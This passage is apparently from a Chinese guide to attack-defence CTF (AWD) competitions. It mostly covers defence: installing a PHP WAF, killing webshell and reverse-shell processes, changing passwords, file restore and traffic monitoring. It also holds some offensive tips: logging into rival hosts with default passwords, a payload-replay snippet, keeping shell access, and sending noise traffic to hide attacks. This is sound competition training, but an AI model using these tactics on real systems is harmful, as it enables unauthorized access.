find /var/www/html -<span class="hljs-built_in">type</span> f -path <span class="hljs-string">"*.php"</span> | xargs sed -i <span class="hljs-string">"s/&lt;?php/&lt;?php include_once(\"\/var\/www\/html\/waf.php\");/g"</span>

上waf：
$ find . -path ./waffffff -prune -o -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">"*.php"</span> -<span class="hljs-built_in">print</span> | xargs sed -i <span class="hljs-string">"s/&lt;?php/&lt;?php include_once(\"\/var\/www\/html\/waffffff\/waf.php\");/g"</span>

下waf：
$ find . -path ./waffffff -prune -o -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">"*.php"</span> -<span class="hljs-built_in">print</span> | xargs sed -i <span class="hljs-string">"s/&lt;?php include_once(\"\/var\/www\/html\/waffffff\/waf.php\");/&lt;?php/g"</span>
</code></pre>
<p>2.</p>
<pre><code class="lang-bash hljs language-bash">vim php.ini

auto_append_file = <span class="hljs-string">"/dir/path/phpwaf.php"</span>

重启Apache或者php-fpm就能生效了。
</code></pre>
<p>3.</p>
<pre><code class="lang-bash hljs language-bash">改 .user.ini配置文件 auto_prepend_file=&lt;filename&gt;;  包含在文件头

auto_append_file=&lt;filename&gt;;  包含在文件尾
php_value auto_prepend_file <span class="hljs-string">"/dir/path/phpwaf.php"</span>
</code></pre>
<p>注：如果挂了waf出现持续扣分，waf去掉</p>
<p><strong>只有user权限</strong></p>
<p>没写系统权限就只能在代码上面下手了，也就是文件包含。</p>
<p>这钟情况又可以用不同的方式包含。</p>
<p>1.</p>
<p>如果是框架型应用，那麽就可以添加在入口文件，例如index.php，</p>
<p>如果不是框架应用，可以在公共配置文件config.php等相关文件中包含。</p>
<pre><code class="lang-bash hljs language-bash">include(<span class="hljs-string">'phpwaf.php'</span>);
</code></pre>
<p>2.</p>
<p>替换index.php，也就是将index.php改名为index2.php，然后讲phpwaf.php改成index.php。</p>
<p>当然还没完，还要在原phpwaf.php中包含原来的index.php</p>
<pre><code class="lang-bash hljs language-bash">index.php -&gt; index2.php
phpwaf.php -&gt;index.php
include(<span class="hljs-string">'index2.php'</span>);
</code></pre>
<ul>
<li>修改权限mysqll用户读表权限上传目录是否可执行的权限</li>
<li>部署文件监控脚本php.ini
<pre><code class="hljs language-ini"><span class="hljs-attr">auto_prepend_file</span> = waf.php的路径<span class="hljs-comment">;</span>
</code></pre>
<pre><code class="hljs language-kotlin">require_once(<span class="hljs-string">'waf.php'</span>);

常用cms添加waf位置
PHPCMS V9 \phpcms\base.php
PHPWIND8<span class="hljs-number">.7</span> \<span class="hljs-keyword">data</span>\sql_config.php
DEDECMS5<span class="hljs-number">.7</span> \<span class="hljs-keyword">data</span>\common.inc.php
DiscuzX2   \config\config_global.php
Wordpress   \wp-config.php
Metinfo   \include\head.php
</code></pre>
</li>
</ul>
<h4 id="h4-u5B8Cu5168u68C0u67E5">
<a class="reference-link" name="%E5%AE%8C%E5%85%A8%E6%A3%80%E6%9F%A5"></a>完全检查</h4>
<p>完全检查大多出现在awd pwn中，比如不允许对漏洞函数进行修改</p>
<h3 name="h3-14" id="h3-14">
<a class="reference-link" name="%E5%85%8B%E5%88%B6%E4%B8%8D%E6%AD%BB%E9%A9%AC"></a>克制不死马</h3>
<ol>
<li>强行kill掉进程后重启服务（不建议）
<pre><code class="lang-bash hljs language-bash">ps -aux|grep ‘www-data’|awk ‘{<span class="hljs-built_in">print</span> <span class="hljs-variable">$2</span>}’|xargs <span class="hljs-built_in">kill</span> -9
</code></pre>
</li>
<li>建立一个和不死马相同名字的文件或者目录，sleep短于不死马</li>
<li>写脚本不断删除</li>
</ol>
<h3 name="h3-15" id="h3-15">
<a class="reference-link" name="%E5%B9%B2%E6%8E%89%E5%8F%8D%E5%BC%B9shell"></a>干掉反弹shell</h3>
<p>ps -ef / px -aux</p>
<p>出现www-data权限的/bin/sh一般为nc</p>
<p><img class="alignnone size-full wp-image-245412 aligncenter" alt="" width="1133" height="51" data-original="https://p1.ssl.qhimg.com/t01bad1fe97c1b010b9.png"></p>
<p>如果有一些进程杀不掉可以尝试www-data权限去杀</p>
<p>kill.php</p>
<pre><code class="lang-php hljs language-php"><span class="hljs-meta">&lt;?php</span>
system(<span class="hljs-string">"kill `ps -aux | grep www-data | grep apache2 | awk '{print <span class="hljs-subst">$2</span>}'`"</span>);
<span class="hljs-meta">?&gt;</span>
</code></pre>
<p>从浏览器访问，就是www-data权限</p>
<p>建议连着kill两次</p>
<h3 name="h3-16" id="h3-16">
<a class="reference-link" name="%E6%94%B9%E5%AF%86%E7%A0%81"></a>改密码</h3>
<p>如果有弱口令，拿到密码后先更改，然后用默认密码去批量登录其他的主机</p>
<h4 id="h4-ssh-">
<a class="reference-link" name="ssh%E5%AF%86%E7%A0%81"></a>ssh密码</h4>
<p>ssh密码就是本机密码</p>
<p>passwd命令改密码</p>
<h4 id="h4-phpmyadmin">
<a class="reference-link" name="phpmyadmin"></a>phpmyadmin</h4>
<p>phpmyadmin的密码就是数据库的密码，直接改mysql密码</p>
<p><img class="alignnone size-full wp-image-245413 aligncenter" alt="" width="671" height="403" data-original="https://p5.ssl.qhimg.com/t012dd1a4d7f7749a1b.png"></p>
<p><img class="alignnone size-full wp-image-245414 aligncenter" alt="" width="1185" height="762" data-original="https://p2.ssl.qhimg.com/t018d05ba809bd86e00.png"></p>
<p>更改密码直接点执行就行，不要点生成（会随机生成新的密码）</p>
<h4 id="h4-mysql">
<a class="reference-link" name="mysql"></a>mysql</h4>
<p>修改mysql登录密码</p>
<p>方法一：</p>
<p>mysql&gt;set password for root<a class="at-link" title="@localhost" href="https://github.com/localhost">@localhost</a> =password(‘ocean888’);</p>
<p>config.php文件中是有数据库的连接信息，执行完上条命令后<strong>更改</strong>此文件</p>
<p>方法二：</p>
<p>mysqladmin -uroot -p 123456 password 123</p>
<p>root=用户名； 123456=旧密码； 123=新密码；</p>
<h4 id="h4-u540Eu53F0u5BC6u7801">
<a class="reference-link" name="%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81"></a>后台密码</h4>
<p>修改后台登录密码</p>
<p>mysql -u root -p</p>
<p>show databases；</p>
<p>use test;</p>
<p>show tables;</p>
<p>select * from admin;</p>
<p>updata admin set user pass=’123456’; //updata 表名 set 字段名 = ‘值’;</p>
<p>flush privileges;</p>
<h3 name="h3-17" id="h3-17">
<a class="reference-link" name="%E6%96%87%E4%BB%B6%E7%9B%91%E6%8E%A7"></a>文件监控</h3>
<h4 id="h4--python-">
<a class="reference-link" name="%E6%9C%AC%E5%9C%B0%E6%9C%89python%E7%8E%AF%E5%A2%83"></a>本地有python环境</h4>
<p>如果有python环境，py文件监控脚本一搜一大堆。。。</p>
<p>贴一个这个师傅写的：<a href="https://www.shuzhiduo.com/A/GBJrKlDG50/">https://www.shuzhiduo.com/A/GBJrKlDG50/</a></p>
<h4 id="h4--python-">
<a class="reference-link" name="%E6%9C%AC%E5%9C%B0%E6%B2%A1%E6%9C%89python%E7%8E%AF%E5%A2%83"></a>本地没有python环境</h4>
<p>可以使用ssh远程去连接靶机进行监控</p>
<ul>
<li>vscode‐&gt;ssh插件或者是phpstorm，实时在线编辑</li>
</ul>
<p>监听还原脚本‐&gt;5分钟还原一次</p>
<p>使用本地py环境运行，需要更改sshIP及端口</p>
<pre><code class="lang-python hljs language-python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span>
<span class="hljs-string">'''
监听还原脚本‐&gt;5分钟还原一次
@File    :   awd.py
@Time    :   2020/08/09 20:44:54
@Author  :   iloveflag 
@Version :   1.0
@Contact :   iloveflag@outlook.com
@Desc    :  The Win32 port can only create tar archives,
            but cannot pipe its output to other programs such as gzip or compress, 
            and will not create tar.gz archives; you will have to use or simulate a batch pipe.
            BsdTar does have the ability to direcly create and manipulate .tar, .tar.gz, tar.bz2, .zip,
            .gz and .bz2 archives, understands the most-used options of GNU Tar, and is also much faster;
            for most purposes it is to be preferred to GNU Tar. 
'''</span>

<span class="hljs-keyword">import</span> paramiko
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">web_server_command</span>(<span class="hljs-params">command,transport</span>): <span class="hljs-comment">#对服务器执行命令</span>
    ssh = paramiko.SSHClient()
    ssh._transport = transport
    stdin, stdout, stderr = ssh.exec_command(command)
    <span class="hljs-comment"># print(stdout.read())</span>


<span class="hljs-keyword">def</span> <span class="hljs-title function_">web_server_file_action</span>(<span class="hljs-params">ip, port, user, passwd, action</span>): <span class="hljs-comment">#对服务器文件操作</span>
    <span class="hljs-keyword">try</span>:
        transport = paramiko.Transport(ip, <span class="hljs-built_in">int</span>(port))
        transport.connect(username=user, password=passwd)
        sftp = paramiko.SFTP.from_transport(transport)
        remote_path=<span class="hljs-string">'/var/www/html/'</span>
        remote_file = <span class="hljs-string">'html.tar'</span>
        local_path = <span class="hljs-string">'C:/Users/'</span>+os.getlogin()+<span class="hljs-string">'/Desktop/awd/'</span>+ip+<span class="hljs-string">'/'</span>
        web_server_command(<span class="hljs-string">'cd '</span>+remote_path+<span class="hljs-string">' &amp;&amp; tar -cvf '</span>+remote_file+<span class="hljs-string">' ./'</span>,transport)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span>(os.path.exists(local_path)):
            os.makedirs(local_path)
        <span class="hljs-keyword">if</span> action == <span class="hljs-string">'get'</span>:
            sftp.get(remote_path+remote_file,local_path+remote_file)
            web_server_command(<span class="hljs-string">'rm -rf '</span>+remote_path+remote_file,transport)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">'服务器源码保存在'</span>+local_path)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">'正在解压:'</span>)
            os.system(<span class="hljs-string">'cd '</span>+local_path+<span class="hljs-string">' &amp; tar -xvf '</span>+remote_file+<span class="hljs-string">' &amp;del '</span>+remote_file)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">'文件解压完成'</span>)
        <span class="hljs-keyword">else</span>:
            web_server_command(<span class="hljs-string">'rm -rf '</span>+remote_path+<span class="hljs-string">'*'</span>,transport)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">'清理服务器web目录'</span>)
            os.system(<span class="hljs-string">'cd '</span>+local_path+<span class="hljs-string">' &amp; tar -cvf '</span>+remote_file+<span class="hljs-string">' ./*'</span>)
            sftp.put(local_path+remote_file, remote_path+remote_file)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">'上传成功'</span>)
            web_server_command(<span class="hljs-string">'cd '</span>+remote_path+<span class="hljs-string">'&amp;&amp; tar -xvf '</span>+remote_file+<span class="hljs-string">' &amp;&amp; rm -rf '</span>+remote_file,transport)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">'还原完毕'</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">'-----------------------------'</span>)
        sftp.close()
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">pass</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'download or upload error'</span>)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">web_server_mysql_action</span>():
    <span class="hljs-comment">#web_server_mysql_action</span>
    <span class="hljs-keyword">pass</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">web_server_status</span>():
    <span class="hljs-comment">#web_server_status</span>
    <span class="hljs-keyword">pass</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    web1_server_ip=<span class="hljs-string">'10.241.180.159'</span>
    web1_server_port=<span class="hljs-string">'30021'</span>
    web1_server_user=<span class="hljs-string">'ctf'</span>
    web1_server_passwd=<span class="hljs-string">'123456'</span>
    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):       
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):
            time.sleep(<span class="hljs-number">1</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">'倒计时'</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">'秒'</span>)
        web_server_file_action(web1_server_ip,web1_server_port,web1_server_user,web1_server_passwd, <span class="hljs-string">'put'</span>)
</code></pre>
<h4 id="h4-scp-">
<a class="reference-link" name="scp%E5%91%BD%E4%BB%A4"></a>scp命令</h4>
<pre><code class="lang-bash hljs language-bash">scp -P 30022 -r -q web ctf@10.241.180.159:/var/www/html

<span class="hljs-comment"># 按照提示输入密码即可</span>
scp [可选参数] file_source file_target 
-P 指定传输到服务器的端口，默认为22
-r 递归传输整个web文件夹
-q 不显示传输进度条
</code></pre>
<p><img class="alignnone size-full wp-image-245415 aligncenter" alt="" width="1172" height="64" data-original="https://p0.ssl.qhimg.com/t01d3d69427cc2d5613.png"></p>
<h3 name="h3-18" id="h3-18">
<a class="reference-link" name="%E5%B8%B8%E7%94%A8linux%E5%91%BD%E4%BB%A4"></a>常用linux命令</h3>
<pre><code class="lang-bash hljs language-bash">ssh &lt;-p 端口&gt; 用户名@IP　　
scp 文件路径  用户名@IP:存放路径　　　　
tar -zcvf web.tar.gz /var/www/html/　　
w 　　　　
pkill -<span class="hljs-built_in">kill</span> -t &lt;用户<span class="hljs-built_in">tty</span>&gt;　　 　　
ps aux | grep pid或者进程名　

<span class="hljs-comment">#查看已建立的网络连接及进程</span>
netstat -antulp | grep EST

<span class="hljs-comment">#查看指定端口被哪个进程占用</span>
lsof -i:端口号 或者 netstat -tunlp|grep 端口号

<span class="hljs-comment">#结束进程命令</span>
<span class="hljs-built_in">kill</span> PID
killall &lt;进程名&gt;　　
<span class="hljs-built_in">kill</span> - &lt;PID&gt;　　

<span class="hljs-comment">#封杀某个IP或者ip段，如：.　　</span>
iptables -I INPUT -s . -j DROP
iptables -I INPUT -s ./ -j DROP

<span class="hljs-comment">#禁止从某个主机ssh远程访问登陆到本机，如123..　　</span>
iptable -t filter -A INPUT -s . -p tcp --dport  -j DROP

<span class="hljs-comment">#检测所有的tcp连接数量及状态</span>
netstat -ant|awk  |grep |sed -e  -e |<span class="hljs-built_in">sort</span>|<span class="hljs-built_in">uniq</span> -c|<span class="hljs-built_in">sort</span> -rn

<span class="hljs-comment">#查看页面访问排名前十的IP</span>
<span class="hljs-built_in">cat</span> /var/log/apache2/access.log | <span class="hljs-built_in">cut</span> -f1 -d   | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -k  -r | <span class="hljs-built_in">head</span> -　　

<span class="hljs-comment">#查看页面访问排名前十的URL</span>
<span class="hljs-built_in">cat</span> /var/log/apache2/access.log | <span class="hljs-built_in">cut</span> -f4 -d   | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -k  -r | <span class="hljs-built_in">head</span> -
</code></pre>
<ul>
<li>如果有root权限可以用chattr命令防止系统中某个关键文件被修改chattr +i /etc/resolv.conf如果想进行修改，必须用命令”chattr -i”取消隐藏属性</li>
<li>ls -t 按修改时间来看最新被修改的文件</li>
</ul>
<h3 name="h3-19" id="h3-19">
<a class="reference-link" name="%E6%B5%81%E9%87%8F%E7%9B%91%E6%8E%A7"></a>流量监控</h3>
<p>流量监控也是可以使用aoiawd进行，aoiawd还是在后边，或者用别的脚本记录流量，有的比赛也会定时提供上阶段流量</p>
<p>被上马一定要先备份到本地，再删除、去分析反打别人</p>
<h4 id="h4-php-">
<a class="reference-link" name="php%E6%B5%81%E9%87%8F%E7%9B%91%E6%8E%A7"></a>php流量监控</h4>
<pre><code class="lang-php hljs language-php"><span class="hljs-meta">&lt;?php</span>

date_default_timezone_set(<span class="hljs-string">'Asia/Shanghai'</span>);

<span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">"REMOTE_ADDR"</span>]; <span class="hljs-comment">//记录访问者的ip</span>

<span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'PHP_SELF'</span>]; <span class="hljs-comment">//访问者要访问的文件名</span>

<span class="hljs-variable">$parameter</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">"QUERY_STRING"</span>]; <span class="hljs-comment">//访问者要请求的参数</span>

<span class="hljs-variable">$time</span> = date(<span class="hljs-string">'Y-m-d H:i:s'</span>,time()); <span class="hljs-comment">//访问时间</span>

<span class="hljs-variable">$logadd</span> = <span class="hljs-string">'来访时间：'</span>.<span class="hljs-variable">$time</span>.<span class="hljs-string">'--&gt;'</span>.<span class="hljs-string">'访问链接：'</span>.<span class="hljs-string">'http://'</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">'?'</span>.<span class="hljs-variable">$parameter</span>.<span class="hljs-string">"\r\n"</span>;

<span class="hljs-comment">// log记录</span>

<span class="hljs-variable">$fh</span> = fopen(<span class="hljs-string">"log.txt"</span>, <span class="hljs-string">"a"</span>);

fwrite(<span class="hljs-variable">$fh</span>, <span class="hljs-variable">$logadd</span>);

fclose(<span class="hljs-variable">$fh</span>);

<span class="hljs-meta">?&gt;</span>
</code></pre>
<h4 id="h4-weblogger">
<a class="reference-link" name="weblogger"></a>weblogger</h4>
<p><a href="https://github.com/wupco/weblogger">一个针对php的web流量抓取、分析的应用。</a></p>
<p>使用方法</p>
<pre><code class="hljs language-bash">   <span class="hljs-built_in">cd</span> /var/www/html/ (or other web <span class="hljs-built_in">dir</span>)

   git <span class="hljs-built_in">clone</span> https://github.com/wupco/weblogger.git

   <span class="hljs-built_in">chmod</span> -R 777 weblogger/

   open http://xxxxx/weblogger/install.php <span class="hljs-keyword">in</span> Web browser

   install it
</code></pre>
<h3 name="h3-20" id="h3-20">
<a class="reference-link" name="wireshark"></a>wireshark</h3>
<h4 id="h4--ip-">
<a class="reference-link" name="%E8%BF%87%E6%BB%A4IP%E5%9C%B0%E5%9D%80"></a>过滤IP地址</h4>
<blockquote><p>(1) ip.addr == 192.168.1.1 //只显示源/目的IP为192.168.1.1的数据包 (2) not ip.src == 1.1.1.1 //不显示源IP为1.1.1.1的数据包 (3 ip.src == 1.1.1.1 or ip.dst == 1.1.1.2 //只显示源IP为1.1.1.1或目的IP为1.1.1.2的数据包</p></blockquote>
<h4 id="h4-u8FC7u6EE4u7AEFu53E3">
<a class="reference-link" name="%E8%BF%87%E6%BB%A4%E7%AB%AF%E5%8F%A3"></a>过滤端口</h4>
<blockquote><p>(1) tcp.port eq 80 #不管端口是来源还是目的都显示80端口 (2) tcp.port == 80 (3) tcp.port eq 2722 (4) tcp.port eq 80 or udp.port eq 80 (5) tcp.dstport == 80 #只显示tcp协议的目标端口80 (6) tcp.srcport == 80 #只显示tcp协议的来源端口80 (7) udp.port eq 15000 (8) tcp.port &gt;= 1 and tcp.port &lt;= 80 #过滤端口范围</p></blockquote>
<h4 id="h4--mac-">
<a class="reference-link" name="%E8%BF%87%E6%BB%A4MAC%E5%9C%B0%E5%9D%80"></a>过滤MAC地址</h4>
<blockquote><p>(1) eth.dst == MAC地址 #过滤目标MAC (2) eth.src eq MAC地址 #过滤来源MAC (3)eth.addr eq MAC地址 #过滤来源MAC和目标MAC都等于MAC地址的</p></blockquote>
<h4 id="h4-http-">
<a class="reference-link" name="http%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%E8%BF%87%E6%BB%A4"></a>http请求方式过滤</h4>
<blockquote><p>(1) http.request.method == “GET” (2) http.request.method == “POST” (3) http.host mathes “www.baidu.com|<a href="https://link.zhihu.com/?target=http%3A//baidu.cn">http://baidu.cn</a>“ #matches可以写多个域名 (4) http.host contains “<a href="https://link.zhihu.com/?target=http%3A//www.baidu.com">http://www.baidu.com</a>“ #contain只能写一个域名 (5) http contains “GET” 例如： http.request.method ==”GET” &amp;&amp; http contains “Host: “ http.request.method == “GET” &amp;&amp; http contains “User-Agent: “ http.request.method ==”POST” &amp;&amp; http contains “Host: “ http.request.method == “POST” &amp;&amp; http contains “User-Agent: “ http contains “HTTP/1.1 200 OK” &amp;&amp; http contains “Content-Type: “ http contains “HTTP/1.0 200 OK” &amp;&amp; http contains “Content-Type: “</p></blockquote>
<h4 id="h4-tcpdump-">
<a class="reference-link" name="TCPdump%E5%88%86%E6%9E%90"></a>TCPdump分析</h4>
<blockquote><p>tcpdump采用命令行方式，它的命令格式为：tcpdump [-adeflnNOpqStvx0] [-c 数量] [-F 文件名] [-i 网络接口] [-r 文件名] [-s snaplen] [-T 类型] [-w 文件名] [表达式]</p></blockquote>
<p>详细参数：</p>
<p>抓包选项：|作用 —-|— -c：|指定要抓取的包数量。 -i interface：|指定tcpdump需要监听的接口。默认会抓取第一个网络接口 -n|：对地址以数字方式显式，否则显式为主机名，也就是说-n选项不做主机名解析。 -nn：|除了-n的作用外，还把端口显示为数值，否则显示端口服务名。 -P：|指定要抓取的包是流入还是流出的包。可以给定的值为”in”、”out”和”inout”，默认为”inout”。 -s len：|设置tcpdump的数据包抓取长度为len，如果不设置默认将会是65535字节。对于要抓取的数据包较大时，长度设置不够可能会产生包截断，若出现包截断，输出行中会出现”[proto]”的标志(proto实际会显示为协议名)。但是抓取len越长，包的处理时间越长，并且会减少tcpdump可缓存的数据包的数量，从而会导致数据包的丢失，所以在能抓取我们想要的包的前提下，抓取长度越小越好。</p>
<p>输出选项：| 作用 ———|—- -e：|输出的每行中都将包括数据链路层头部信息，例如源MAC和目标MAC。 -q：|快速打印输出。即打印很少的协议相关信息，从而输出行都比较简短。 -X：|输出包的头部数据，会以16进制和ASCII两种方式同时输出。 -XX：|输出包的头部数据，会以16进制和ASCII两种方式同时输出，更详细。 -v：|当分析和打印的时候，产生详细的输出。 -vv：|产生比-v更详细的输出。 -vvv：|产生比-vv更详细的输出。</p>
<p>其他功能性选项：|作用 —-|—- -D：|列出可用于抓包的接口。将会列出接口的数值编号和接口名，它们都可以用于”-i”后。 -F：|从文件中读取抓包的表达式。若使用该选项，则命令行中给定的其他表达式都将失效。 -w：|将抓包数据输出到文件中而不是标准输出。可以同时配合”-G time|选项使得输出文件每time秒就自动切换到另一个文件。可通过”-r”选项载入这些文件以进行分析和打印。 -r：|从给定的数据包文件中读取数据。使用”-“表示从标准输入中读取。</p>
<h4 id="h4-u7AEFu53E3u8FC7u6EE4">
<a class="reference-link" name="%E7%AB%AF%E5%8F%A3%E8%BF%87%E6%BB%A4"></a>端口过滤</h4>
<pre><code class="lang-text hljs language-plaintext">抓取所有经过ens33，目的或源端口22的网络数据：
tcpdump -i ens33 port 22
指定源端口：tcpdump -i ens33 sec port 22
指定目的端口: tcpdump -i ens33 dst port 22
</code></pre>
<h4 id="h4-u7F51u7EDCu8FC7u6EE4">
<a class="reference-link" name="%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4"></a>网络过滤</h4>
<pre><code class="lang-text hljs language-plaintext">tcpdump -i ens33 net 192.168.1.1
tcpdump -i ens33 src net 192.168.1.1 #源端口
tcpdump -i ens33 dst net 192.168.1.1 #目的端口
</code></pre>
<h4 id="h4-u534Fu8BAEu8FC7u6EE4">
<a class="reference-link" name="%E5%8D%8F%E8%AE%AE%E8%BF%87%E6%BB%A4"></a>协议过滤</h4>
<pre><code class="lang-text hljs language-plaintext">tcpdump -i ens33 arp
tcpdump -i ens33 ip
tcpdump -i ens33 tcp
tcpdump -i ens33 udp
tcpdump -i ens33 icmp
tcpdump -w 1.pcap #抓所有包保存到1.pcap中然后使用wireshark分析
</code></pre>
<h3 name="h3-21" id="h3-21">
<a class="reference-link" name="apache2%E6%97%A5%E5%BF%97"></a>apache2日志</h3>
<p>/var/log/apache2/</p>
<p>/usr/local/apache2/logs</p>
<h3 name="h3-22" id="h3-22">
<a class="reference-link" name="awd%E4%B8%ADlinux%E7%9A%84%E5%91%BD%E4%BB%A4"></a>awd中linux的命令</h3>
<pre><code class="lang-bash hljs language-bash">- netstat -anptl 查看开放端口

- ps aux 以用户为主的格式来查看所有进程

  pa aux | grep tomcat

  ps -A 显示进程信息

  ps -u root 显示root进程用户信息

  ps -ef 显示所有命令，连带命令行

- <span class="hljs-built_in">kill</span> 终止进程

  <span class="hljs-built_in">kill</span> -9 pid

  //kill -15、<span class="hljs-built_in">kill</span> -9的区别

  执行<span class="hljs-built_in">kill</span>（默认<span class="hljs-built_in">kill</span> -15）命令，执行<span class="hljs-built_in">kill</span> (默认kill-15) 命令，系统会发送一个SIGTERM信号给对应的程序，,大部分程序接收到SIGTERM信号后，会先<span class="hljs-built_in">kill</span> -9命令,系统给对应程序发送的信号是SIGKILL,即<span class="hljs-built_in">exit</span>。<span class="hljs-built_in">exit</span>信号不会被系统阻塞，所以<span class="hljs-built_in">kill</span> -9能顺利杀掉进程

- vim编辑器

  命令行模式下

  /  查找内容

  ?  查找内容

  n  重复上一条检索命令

  N  命令重复上一条检索命令
</code></pre>
<p>&nbsp;</p>
<h2 name="h2-23" id="h2-23">两个awd神器</h2>
<h3 name="h3-24" id="h3-24">
<a class="reference-link" name="AoiAWD"></a>AoiAWD</h3>
<p>aoiawd地址：<a href="https://github.com/DasSecurity-HatLab/AoiAWD">https://github.com/DasSecurity-HatLab/AoiAWD</a></p>
<p>下载好，自己去编译或者找编译好的直接用</p>
<h4 id="h4-u4F7Fu7528">
<a class="reference-link" name="%E4%BD%BF%E7%94%A8"></a>使用</h4>
<p>把刚刚那些文件夹中的生成的文件例如xxx.phar等发送到提供给的靶机上去，然后记得赋予权限，ip是自己电脑ip，端口就是默认8023</p>
<pre><code class="hljs language-bash"><span class="hljs-comment"># web的流量监控</span>
<span class="hljs-built_in">chmod</span> +x tapeworm.phar
<span class="hljs-comment"># 进程监控</span>
<span class="hljs-built_in">chmod</span> +x roundworm
<span class="hljs-comment"># pwn的监控</span>
<span class="hljs-built_in">chmod</span> +x guardian.phar

./tapeworm.phar -d 目录 -s ip:port
./roundworm  -w 目录 -s ip -p port
./guardian.phar -i 目录 -s ip:port


./tapeworm.phar -d /var/www/html -s ip
./roundworm  -w /var/www/html -s ip -p
./guardian.phar -i /var/www/html -s ip
</code></pre>
<p>本地需要在命令行启动aoiawd</p>
<p>启动方式：</p>
<pre><code class="lang-bash hljs language-bash">php aoiawd.phar
</code></pre>
<p><img class="alignnone size-full wp-image-245416 aligncenter" alt="" width="1156" height="252" data-original="https://p2.ssl.qhimg.com/t01a5dd02b3671d1f0e.png"></p>
<p>web端口1337</p>
<p><img class="alignnone size-full wp-image-245417 aligncenter" alt="" width="1186" height="537" data-original="https://p0.ssl.qhimg.com/t010bfbdbf40e09d0df.png"></p>
<p>token就是命令行启动时access token</p>
<p>成功进入页面</p>
<p><img class="alignnone size-full wp-image-245418 aligncenter" alt="" width="1183" height="547" data-original="https://p3.ssl.qhimg.com/t0136256c22abd9f3fc.png"></p>
<p>左侧可以看到各个模块，使用方式非常简单</p>
<h4 id="h4-u6307u5B9Au7AEFu53E3u91CDu653E">
<a class="reference-link" name="%E6%8C%87%E5%AE%9A%E7%AB%AF%E5%8F%A3%E9%87%8D%E6%94%BE"></a>指定端口重放</h4>
<p>需要将上边的单个ip的注释掉，下边的这个改ip和端口</p>
<pre><code class="lang-php hljs language-php"><span class="hljs-comment">// 批量端口</span>
<span class="hljs-variable">$ports</span> = [<span class="hljs-number">10024</span>, <span class="hljs-number">10021</span>, <span class="hljs-number">10023</span>];
<span class="hljs-variable">$host1</span> = <span class="hljs-string">"http://"</span> . <span class="hljs-string">'10.241.180.159'</span>;
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$ports</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$port</span>) {
    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$host1</span> . <span class="hljs-string">':'</span> . <span class="hljs-variable">$port</span>;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Sending to: <span class="hljs-subst">{$host}</span>\n\n"</span>;
    sendPayload(<span class="hljs-variable">$host</span>);
}
<span class="hljs-keyword">exit</span>;
</code></pre>
<h3 name="h3-25" id="h3-25">
<a class="reference-link" name="watchbird"></a>watchbird</h3>
<p>这是个通防waf，支持流量转发和替换flag</p>
<p>地址：<a href="https://github.com/leohearts/awd-watchbird">https://github.com/leohearts/awd-watchbird</a></p>
<p>&nbsp;</p>
<h2 name="h2-26" id="h2-26">Fix</h2>
<p>一个大佬总结的漏洞快修思路</p>
<p><a href="https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/">https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/</a></p>
<p>最后：</p>
<p>保持良好的心态，不到最后一刻都有翻盘的可能</p>
<p>找出漏洞拿到shell，权限维持后，尽量把这个洞给被控机修了，以免被别人拿到shell</p>
<p>不仅要保证自己能拿到shell，还有保证别人拿不到shell</p>
<p>拿shell前先打一波流量，混淆视听</p>
<p>保证自己的网站上没有d盾可以扫出来的后门</p>
<p>提高python脚本编写能力</p>
<p>&nbsp;</p>
<h2 name="h2-27" id="h2-27">优秀文章</h2>
<p><a href="https://www.anquanke.com/post/id/84675">《CTF线下赛AWD模式下的生存技巧》</a></p>
<p><a href="http://www.freebuf.com/articles/web/118149.html">《论如何在CTF比赛中搅“shi”》</a></p>
<p><a href="https://www.anquanke.com/post/id/86984">《CTF线下防御战 — 让你的靶机变成“铜墙铁壁”》</a></p>
<p><a href="https://github.com/Ares-X/AWD-Predator-Framework">AWD攻防赛webshell批量利用框架</a></p>
<p><a href="https://github.com/wupco/weblogger">针对ctf线下赛流量抓取(php)、真实环境流量抓取分析的工具</a></p>
<p><a href="https://github.com/admintony/Prepare-for-AWD">AWD攻防赛脚本集合</a></p>
<p><a href="https://github.com/ssooking/CTFDefense">CTFDefense</a></p>

